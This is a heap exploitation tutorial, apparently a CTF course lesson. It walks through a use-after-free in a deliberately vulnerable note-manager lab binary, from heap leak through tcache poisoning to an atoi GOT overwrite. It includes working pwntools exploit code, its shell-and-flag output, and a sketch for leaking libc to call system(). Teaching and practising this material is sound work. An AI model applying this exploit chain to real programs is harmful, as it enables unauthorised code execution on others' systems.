---
title: "Lesson 9.4: Heap Note Lab, From UAF to Shell"
image:
  path: /assets/img/covers/pwn-9-4-heap-note-lab-uaf-shell.webp
  alt: "Heap Note Lab, From UAF to Shell"
date: 2022-12-21 00:16:00 +0700
categories: ["Binary Exploitation", "Pwn · Heap Basics"]
tags: [pwn, heap, tcache-poisoning, got-overwrite]
render_with_liquid: false
---

The last lesson of the heap part gathers everything into one program: a "note" style CTF binary with a UAF bug. The goal: starting from the familiar menu, find the bug yourself, leak the heap, run tcache poisoning to overwrite a GOT entry with a backdoor, get a shell, and read the flag. Everything runs live on glibc 2.39.

![Chaining UAF leak, tcache poisoning, and a GOT overwrite into one exploit](/assets/img/pwn/pwn-9-4-heap-note-lab-uaf-shell.svg)
_Leak heap_base from a freed note, poison next with hi XOR target, then redirect atoi@got to backdoor._

**Prerequisites:** Lessons 9.1, 9.2, 9.3 (required). Lesson 8.1 (GOT overwrite). Lesson 6.2 if you want to extend this to leaking libc.

**Tools:** pwntools, gdb, gcc. Binary provided in the Lab section below.

## Goals

By the end you can triage a heap note binary and spot the UAF from how the menu manages pointers, chain the steps together: leak heap, poison, overwrite the GOT, trigger it, handle alignment when targeting a GOT entry and choose a safe one, understand the RELRO condition a GOT overwrite needs, and get a shell and read the flag using exactly the technique from 9.3.

## Theory

### The "note" program pattern and its usual bug

A lot of pwn challenges are some kind of "note manager": a menu with `add/del/edit/view`, an array of pointers `notes[]` and a size array `sizes[]`. The classic bug: `del` calls `free` but never sets `notes[i] = NULL`. That leaves every deleted slot with a UAF: `edit` can write onto the freed chunk (poisoning its metadata), `view` can read it (leaking data).

Approach (covered in detail in Lesson 10.1): go through each menu command and note where it mallocs/frees/reads/writes, whether the pointer is NULLed after free, and whether `edit`/`view` check that a slot is still alive. Seeing `del` not NULLing the pointer is seeing your way in.

### GOT overwrite via poisoning

In 9.3 we overwrote a function pointer variable. Here the target is a GOT entry (the Global Offset Table, holding the real address of a library function once it has been resolved). If we overwrite the GOT entry of a library function with the address of `backdoor`, the next time the program calls that library function it jumps into `backdoor`. The binary is no-PIE, so both `backdoor` and the GOT entries sit at fixed addresses, no leak of code needed.

Condition: `.got.plt` must be writable. That means Partial RELRO (partial protection, lazy binding). This happens to be the default gcc setting on Ubuntu 24.04 for an ordinary binary, so we can rely on it. Full RELRO would lock the GOT read-only and block this entirely; in that case you would fall back to overwriting a function pointer inside the program (as in 9.3) or targeting a different structure.

### Choosing a GOT entry and the alignment problem

Recall from 9.3: the address malloc returns must be 16-byte aligned (`aligned_OK`). GOT entries are 8 bytes apart, so only half of them are 16-byte aligned (ending in 0x0), the rest are only 8-byte aligned (ending in 0x8), as seen on the sample binary.

```
free@got   = 0x404000  (16-aligned)
puts@got   = 0x404018  (only 8-aligned)
printf@got = 0x404030  (16-aligned)
read@got   = 0x404038  (only 8-aligned)
atoi@got   = 0x404050  (16-aligned)
```

There are two options when the entry you want is only 8-byte aligned.

- Aim TARGET at `that_entry - 8` (16-aligned), and pad 8 bytes before the value in `edit` so it lands exactly on the entry.
- Or pick a different entry that is already 16-aligned and just as convenient to trigger.

There is a specific trap with the first GOT entry: `free@got = 0x404000` is 16-aligned, but the chunk header placed there (at `0x404000 - 0x10 = 0x403ff0`) overlaps the loader's own reserved GOT entries (GOT[1] is the link_map, GOT[2] is the resolver pointer). Touching that region next tends to corrupt the resolver link and crash. We actually hit this exact crash while testing. So instead we pick `atoi@got` (0x404050): 16-aligned, not the first entry, and triggered very naturally since the menu uses `atoi` to read numbers.

## Demo

Environment: Ubuntu 24.04.4 LTS, glibc 2.39, gcc 13.3.0. ASLR enabled. The exploit runs reliably.

The binary (source in the Lab section below) is a Note Manager: `add` (choose an index and size), `del` (frees, but does not NULL, the bug), `edit` (writes `sizes[i]` bytes), `view` (prints 8 bytes). There is a `backdoor()` that runs `system("/bin/sh")`, and a `flag.txt` to read once you have a shell. Build with Partial RELRO, the default.

```bash
cd labs/9.4 && ./build.sh
```

Here is the exploit chain.

```python
SZ = 0x30
add(0, SZ); add(1, SZ)          # two notes in the same 0x40 bin
dele(0); dele(1)                # tcache[0x40]: count=2, head=note1

hi = u64(view(0))               # note0 (second in the bin): fd = note0>>12 = heap_base>>12
target = elf.got['atoi']        # 0x404050, already 16-aligned

edit(1, p64(hi ^ target))       # note1.fd = PROTECT(note1, atoi@got); note1>>12 == hi
add(2, SZ)                      # -> note1
add(3, SZ)                      # -> atoi@got  (notes[3] = &atoi@got)
edit(3, p64(elf.sym['backdoor']))   # *atoi@got = backdoor

io.sendafter(b'> ', b'add')     # trigger: start an 'add'
io.sendlineafter(b'idx> ', b'0')# the number we type goes through atoi() -> backdoor() -> /bin/sh
```

The nice part of this calculation: we never hardcode the chunk's offset inside the heap. Since `PROTECT(note1, target) = (note1 >> 12) XOR target`, and `note1 >> 12 = heap_base >> 12 = hi` (note0 and note1 are both on the first page), the poison value is simply `hi XOR target`. Only `hi` needs to be leaked, no absolute offset required.

Triggering: once `atoi@got = backdoor`, every time the program reads a number (for example the `idx>` prompt inside `add`) it calls `atoi(string)` and jumps into `backdoor`, ignoring its argument. That gives us a shell.

This is the real output (ASLR on).

```
[*] heap_base = 0x3b41b000
[*] atoi@got(0x404050) <- backdoor(0x401296)
[backdoor] GOT overwritten -> /bin/sh
===PWNED_9_4===
uid=0(root) gid=0(root) groups=0(root)
PTIT{h3ap_n0t3_tc4ch3_p0is0n_2026}
===END===
[+] capstone OK: GOT overwrite (atoi->backdoor) -> shell -> flag
```

### Extension: when there is no backdoor

Real binaries rarely hand you a ready-made `backdoor`. When there is none, the usual target is overwriting a GOT entry with `system` from libc. But `system` lives in libc, so you need to leak the libc base first (ASLR is on). A heap-only way to leak it: allocate a chunk large enough to miss tcache (for example `malloc(0x450)`), free it so it lands in the unsorted bin; an unsorted chunk's `fd`/`bk` point into `main_arena` inside libc, so `view`ing it leaks libc. With the libc base in hand, write `atoi@got = system` and send `"/bin/sh"` as the "number". This is the natural next step once you have covered Lesson 6.2 on leaking libc.

## Lab

<div class="lab-box">
<div class="lab-head"><b>LAB 9.4</b>Download the lab files</div>
<div class="lab-files">
<a class="lab-file lab-all" href="/assets/labs-pwn/9.4.zip" download><i class="fa-solid fa-file-zipper"></i>Download all (.zip)</a>
<a class="lab-file" href="/assets/labs-pwn/9.4/build.sh" download><i class="fa-solid fa-file-code"></i>build.sh</a>
<a class="lab-file" href="/assets/labs-pwn/9.4/exploit.py" download><i class="fa-solid fa-file-code"></i>exploit.py</a>
<a class="lab-file" href="/assets/labs-pwn/9.4/src.c" download><i class="fa-solid fa-file-code"></i>src.c</a>
</div>
</div>

- Challenge: exploit the binary provided in the Lab section below.
- Goal: get a shell and read `flag.txt`.
- Hints, in order:
  - Hint 1: which menu command leaves behind a dangling pointer? Do `edit`/`view` check whether a slot is still alive?
  - Hint 2: leak the heap by `view`ing a freed slot (remember it prints an obfuscated `fd`).
  - Hint 3: which GOT entry do you pick? Avoid the first one, pick a 16-aligned one the menu calls often (hint: `atoi`).
  - Hint 4: free two chunks for count=2, then poison the bin head. Write `backdoor` into the GOT entry. How do you trigger it?
  - Self-check: can you point out all four pieces (UAF, heap leak, poisoning with safe-linking, a 16-aligned GOT entry plus trigger)?

## Key takeaways

- Note app pattern: `del` not NULLing the pointer is the sign of a UAF.
- Leak the heap from the `fd` of a freed slot (safe-linking).
- Poisoning only needs `hi XOR target`, with `hi = heap_base >> 12` (no absolute offset needed).
- A GOT overwrite needs Partial RELRO (writable GOT).
- Pick a 16-aligned GOT entry, and avoid the first `.got.plt` entry.
- Trigger: call the library function you just overwrote (here, `atoi`, triggered by typing a number).

## Common pitfalls

- Targeting `free@got` (the first entry). It is 16-aligned, but the chunk header overlaps the loader's reserved GOT entries, and the next operation causes a crash (jumping to address 0). Pick `atoi@got` or another entry instead.
- Forgetting the Partial RELRO requirement. If the binary is Full RELRO, writing to the GOT is a SIGSEGV (read-only). Check `checksec` first. If so, switch the target to a function pointer inside the program instead.
- Padding incorrectly when the entry is only 8-byte aligned. Targeting `entry - 8` but forgetting the 8-byte pad shifts the write one entry off.
- Single-free (count gate, as in 9.3). You must free two chunks.
- Hardcoding the chunk offset. Use the `hi XOR target` formula to avoid depending on an absolute offset, so it works with ASLR on.
- Writing too many bytes in `edit` and corrupting the neighboring GOT entry. Write exactly the 8 bytes needed.

## Further reading

- Lesson 10.1 (approach to an unknown binary) and 10.2 (write-up) for triage practice.
- how2heap and nightmare (guyinatuxedo): many beginner-level heap note challenges.
- Lesson 6.2 to add a libc leak step, unlocking a GOT overwrite to `system` when there is no backdoor.
- glibc source `malloc/malloc.c` to cross-reference every check encountered so far.
